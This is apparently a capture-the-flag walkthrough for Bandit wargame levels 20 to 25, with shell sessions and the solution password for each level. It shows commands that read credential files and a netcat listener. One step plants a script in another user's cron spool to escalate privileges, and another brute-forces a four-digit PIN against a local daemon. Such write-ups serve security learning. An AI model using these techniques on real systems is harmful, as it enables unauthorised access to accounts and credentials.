# Levels 20-25

## Level 20 -> 21
There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).
```sh
# use tmux to create netcat listener for password, detach, run suconnect, reattach and read password
$ tmux
$ cat /etc/bandit_pass/bandit20 | nc -l -p 4444
Ctrl+b, d to detach
$ ./suconnect 4444
$ tmux attach
EeoULMCra2q0dSkYj561DX7s1CpBuOBt
```
- **EeoULMCra2q0dSkYj561DX7s1CpBuOBt**

## Level 21 -> 22
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
```sh
# explore cron directory
$ ls /etc/cron.d/
behemoth4_cleanup  clean_tmp  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  leviathan5_cleanup  manpage3_resetpw_job  otw-tmp-dir  sysstat
```
```sh
# read cronjob
$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
```
```sh
# script creates file in tmp directory, gives read perms to everyone then copies password to file
$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
```sh
# read file that script in previous step creatd
$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
```
- **tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q**

## Level 22 -> 23
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

```sh
# explore cronjob
$ ls /etc/cron.d
$ cat cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
```

`$ cat /usr/bin/cronjob_bandit23.sh`
```sh
# script uses $myname variable to write a password into file in tmp dir
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```
```sh
# substitute bandit23 in place of the variable returns the tmp dir we need
$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
```
```sh
# read password from temp dir
$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```
- **0Zf11ioIjMVN551jX3CmStKLYqjk54Ga**

## Level 23 -> 24
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

```sh
# search directory and read cronjob_bandit24
bandit23@bandit:~$ ls -la /etc/cron.d/
total 60
drwxr-xr-x   2 root root  4096 Oct 14 09:29 .
drwxr-xr-x 128 root root 12288 Oct 27 05:55 ..
-r--r-----   1 root root    47 Oct 14 09:26 behemoth4_cleanup
-rw-r--r--   1 root root   123 Oct 14 09:19 clean_tmp
-rw-r--r--   1 root root   120 Oct 14 09:26 cronjob_bandit22
-rw-r--r--   1 root root   122 Oct 14 09:26 cronjob_bandit23
-rw-r--r--   1 root root   120 Oct 14 09:26 cronjob_bandit24
-rw-r--r--   1 root root   201 Apr  8  2024 e2scrub_all
-r--r-----   1 root root    48 Oct 14 09:27 leviathan5_cleanup
-rw-------   1 root root   138 Oct 14 09:28 manpage3_resetpw_job
-rwx------   1 root root    52 Oct 14 09:29 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 31  2024 .placeholder
-rw-r--r--   1 root root   396 Jan  9  2024 sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

```sh
bandit23@bandit:/$ cat /usr/bin/cronjob_bandit24.sh
# cronjob is checking scripts in directory, running them and then deleting them
# it checks if the owner is bandit23 and runs if true

#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
```sh
# create temp directory and open nano
bandit23@bandit:/tmp$ mktemp -d
/tmp/tmp.d1xcoODAjz
bandit23@bandit:/tmp$ cd /tmp/tmp.d1xcoODAjz
bandit23@bandit:/tmp/tmp.d1xcoODAjz$ nano bandit24_pass.sh
```
```sh
# create script that makes cronjob (as bandit24) read password and copy it to temp directory
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.d1xcoODAjz/password
```
``` sh
# add permissions to directory and script
chmod 777 /tmp/tmp.d1xcoODAjz
chmod 777 bandit24_pass.sh

# copy script to directory for cronjob to run
cp bandit24_pass.sh /var/spool/bandit24/foo/

# after waiting a minute, read password
cat password
```
- **gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8**

## Level 24 -> 25
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

```sh
# create temp directory and open nano
bandit24@bandit:~$ mktemp -d
/tmp/tmp.QYA7ne3EJ3
bandit24@bandit:~$ cd /tmp/tmp.QYA7ne3EJ3
bandit24@bandit:/tmp/tmp.QYA7ne3EJ3$ nano bruteforce.sh
```
```sh
# script looping through pin combinations and sending to localhost:30002

#!/bin/bash

password=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

for i in {0000..9999}; do
    echo "$password $i"
done | nc localhost 30002
```
```sh
# script ran through thousands of possibilities until finding correct pin
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
etc...
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```
- **iCi86ttT4KSNe1armKiwbQNmB3YJP3q4**